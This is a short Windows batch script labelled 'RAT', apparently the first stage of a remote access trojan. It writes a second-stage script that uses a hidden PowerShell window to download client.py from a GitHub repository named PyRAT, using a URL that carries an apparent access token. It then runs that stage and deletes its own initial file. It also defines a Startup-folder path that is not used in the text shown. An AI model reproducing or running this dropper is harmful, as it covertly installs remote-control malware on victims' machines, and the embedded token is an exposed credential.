@REM RAT

@REM varibles
set "INITIALFILE=%cd%"
set "STARTUPFILE=C:\Users\AS17004\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

@REM Stage2 File
(
    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Alvsch/PyRAT/master/client.py?token=GHSAT0AAAAAABSLTOH4PNJQ2H5RHHTWYPVEYRYHRAA -OutFile client.py"

) > stage2.cmd

powershell ./stage2.cmd

cd "%INITIALFILE%"
del initial.cmd